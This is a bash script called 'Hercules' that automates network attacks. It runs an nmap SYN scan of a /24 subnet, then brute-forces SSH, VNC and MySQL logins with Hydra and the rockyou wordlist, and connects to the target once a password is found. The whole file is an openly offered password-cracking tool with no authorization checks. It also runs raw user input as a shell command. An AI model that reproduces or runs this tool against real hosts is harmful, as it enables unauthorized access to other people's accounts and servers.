#!/bin/bash

# Root user
root=0

#this contains the nothing array
empty=("" " ")

#the yes array that contains the yes input
yes=("yes" "YES" "y" "Y")

#the array that contains the exit input
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

if [ "$1" = "--help" ]; then
    figlet "? HELP ?"
    echo
    echo "+++++++++++++++Programs used+++++++++++++++"
    echo "This program will help you crack passwords"
    echo "It has two programs inside it, one is Hydra and the other is Nmap"
    echo
    echo "+++++++++++++++How to use++++++++++++++++++"
    echo "To use the program you have to tell the computer what port you want to scan."
    echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
    echo "If there are any ports that are open, it will ask for a username and hostname."
    echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
    echo

else
    if [[ "$OSTYPE" == "linux"* ]]; then
        clear
        if [[ $EUID -ne $root ]]; then
            # Error message if not running as root
            echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
            echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
            exit
        else
            sudo rm -rf hydra.restore
            clear

            wget -q --spider http://google.com

            # If the user is connected to the internet, it works as normal
            if [[ $? -eq 0 ]]; then
                echo
            
            # Else, it notifies them that they are not connected to the internet and tells them to connect
            else
                # Error message if offline
                echo "ERROR:root:TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE." >> ERROR.LOG
                echo "TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE"
            fi

            # clear the terminal
            clear

            #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
            Hercules() {
                # The logo of the program
                figlet -f slant "Hercules"

                echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                echo "Or if you need help just type 'help'"
                echo "If you want to stop the program type 'stop'."
                read -p ">>> " service

                if [[ $service == "ALL" || $service == "all" ]]; then
                    # Tells the user that it can take up to an hour to complete the scanning process
                    echo "This can take up to 1 hour to complete."
                    # Scan the entire network and display open ports
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                    hydra -h
                    echo "Put in hydra first to start the script."
                    read -p ">>> " Hydra

                    if [[ $Hydra == "exit" ]]; then
                        echo "GoodBye"
                        exit
                    else
                        $Hydra
                        exit
                    fi

                elif [[ " ${exit[*]} " == *" $service "* ]]; then
                    echo "Stoping program..."
                    sleep 1
                    exit
                elif [[ " ${empty[*]} " == *" $service "* ]]; then
                    clear
                    Hercules
                else
                    # Scan specific port
                    sudo nmap -sS 192.168.1.1/24 -p $service --open
                fi
            }

            RunHackingCommand() {
                #break in the outputs of my code
                echo 
                #services to crack the network
                echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                read -p "Input Username: " user
                read -p "Input Hostname: " host
            }

            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        RunHackingCommand
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                        echo "Loading VNC server..."
                        open vnc://$host
                        exit
                    fi
                fi
            }

            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "ssh" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        RunHackingCommand
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else

                        # Crack SSH password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                        echo "Connecting to $user@$host"
                        sleep 3
                        ssh $user@$host
                    fi
                fi
            }

            RunHackingCommandWithMySQL() {
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        RunHackingCommand
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack MySQL password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                        echo "Loading MySQL server..."
                        sleep 3
                        mysql -u $user -p -A
                    fi
                fi
            }
            
            Hercules # Calls the Hercules function

            RunHackingCommand # Calls the RunHackingCommand function

            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi